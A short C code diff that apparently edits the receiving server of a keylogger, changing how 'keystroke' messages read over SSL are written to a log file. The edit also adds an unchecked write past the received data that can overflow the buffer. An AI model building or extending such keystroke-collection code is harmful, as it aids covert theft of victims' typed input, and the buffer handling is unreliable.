@@ -117,8 +117,9 @@ int main(void) {
             int size;
             while ((size = SSL_read(ssl, buffer, MAX_PAYLOAD)) > 0) {
                 if (buffer[0] == 'k') {
+                    buffer[size] = '\n';
                     //Keystroke message
-                    fwrite(buffer + 1, 1, size - 1, key_file);
+                    fwrite(buffer + 1, 1, size, key_file);
                     fflush(key_file);
                 } else {
                     for (int i = 0; i < size; ++i) {
